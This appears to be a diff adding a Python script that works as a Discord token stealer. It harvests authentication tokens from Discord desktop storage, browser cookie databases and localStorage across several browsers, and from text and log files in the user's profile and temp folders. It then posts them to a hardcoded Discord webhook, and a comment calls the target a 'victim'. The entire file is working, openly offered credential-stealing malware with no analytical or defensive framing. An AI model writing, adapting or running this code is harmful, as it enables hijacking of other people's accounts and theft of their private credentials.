@@ -1,0 +1,125 @@
+import os, re, sqlite3, shutil, glob, requests
+from pathlib import Path
+
+WEBHOOK = "https://discord.com/api/webhooks/1501597067926044736/VZZxbllJi-SrXWpiYFBgGRmDYM1xH-Y-bJC8w03rduLAnk4-f3who1qPSjaWRI_FVHWV"   # 🔴 REPLACE
+
+# ---------- Helper: extract tokens from any text ----------
+def extract_tokens(text):
+    patterns = [
+        r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',      # standard
+        r'mfa\.[\w-]{84}',                      # MFA token
+        r'[\w-]{24,28}\.[\w-]{6,7}\.[\w-]{27,38}' # extended
+    ]
+    tokens = []
+    for p in patterns:
+        tokens.extend(re.findall(p, text))
+    return list(set(tokens))
+
+# ---------- Method 1: Discord Desktop LevelDB ----------
+def scan_leveldb(path):
+    tokens = []
+    if not os.path.isdir(path):
+        return tokens
+    for f in os.listdir(path):
+        if f.endswith(('.log', '.ldb')):
+            try:
+                with open(os.path.join(path, f), 'r', errors='ignore') as fp:
+                    tokens.extend(extract_tokens(fp.read()))
+            except:
+                pass
+    return tokens
+
+def discord_desktop_tokens():
+    tokens = []
+    appdata = os.getenv('APPDATA')
+    localapp = os.getenv('LOCALAPPDATA')
+    possible_paths = []
+    for base in [appdata, localapp]:
+        if not base:
+            continue
+        for variant in ['discord', 'discordcanary', 'discordptb']:
+            possible_paths.append(os.path.join(base, variant, 'Local Storage', 'leveldb'))
+    for p in possible_paths:
+        tokens.extend(scan_leveldb(p))
+    return tokens
+
+# ---------- Method 2: Browser Cookies (Discord web) ----------
+def browser_cookie_tokens():
+    tokens = []
+    browsers = {
+        'Chrome': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies'),
+        'Edge': os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cookies'),
+        'Brave': os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Cookies'),
+        'Opera': os.path.expandvars(r'%APPDATA%\Opera Software\Opera Stable\Cookies'),
+        'Vivaldi': os.path.expandvars(r'%LOCALAPPDATA%\Vivaldi\User Data\Default\Cookies')
+    }
+    for name, path in browsers.items():
+        if not os.path.isfile(path):
+            continue
+        temp = os.environ['TEMP'] + f'\\{name}_cookies.db'
+        try:
+            shutil.copy2(path, temp)
+            conn = sqlite3.connect(temp)
+            cur = conn.cursor()
+            cur.execute("SELECT value FROM cookies WHERE name = 'token' OR host_key LIKE '%discord%'")
+            for row in cur.fetchall():
+                val = row[0]
+                if val and len(val) > 30:
+                    tokens.extend(extract_tokens(val))
+            conn.close()
+            os.remove(temp)
+        except:
+            try: os.remove(temp)
+            except: pass
+    return tokens
+
+# ---------- Method 3: Browser LocalStorage (Discord web) ----------
+def browser_localstorage_tokens():
+    tokens = []
+    localStorage_paths = [
+        os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb'),
+        os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Local Storage\leveldb'),
+        os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb')
+    ]
+    for path in localStorage_paths:
+        if not os.path.isdir(path):
+            continue
+        for f in os.listdir(path):
+            if f.endswith(('.log', '.ldb')):
+                try:
+                    with open(os.path.join(path, f), 'r', errors='ignore') as fp:
+                        tokens.extend(extract_tokens(fp.read()))
+                except:
+                    pass
+    return tokens
+
+# ---------- Method 4: Common token storage files (backup) ----------
+def common_files_tokens():
+    tokens = []
+    # Search known token dumps (victim might have saved)
+    search_dirs = [os.environ['USERPROFILE'], os.environ['TEMP']]
+    for d in search_dirs:
+        for ext in ['*.txt', '*.log', '*.json']:
+            for f in glob.glob(os.path.join(d, ext)):
+                try:
+                    with open(f, 'r', errors='ignore') as fp:
+                        tokens.extend(extract_tokens(fp.read()))
+                except:
+                    pass
+    return tokens
+
+# ---------- Main ----------
+def main():
+    all_tokens = []
+    all_tokens.extend(discord_desktop_tokens())
+    all_tokens.extend(browser_cookie_tokens())
+    all_tokens.extend(browser_localstorage_tokens())
+    all_tokens.extend(common_files_tokens())
+
+    # Deduplicate
+    unique = list(set(all_tokens))
+    if unique:
+        requests.post(WEBHOOK, json={"discord_tokens": unique})
+
+if __name__ == '__main__':
+    main()
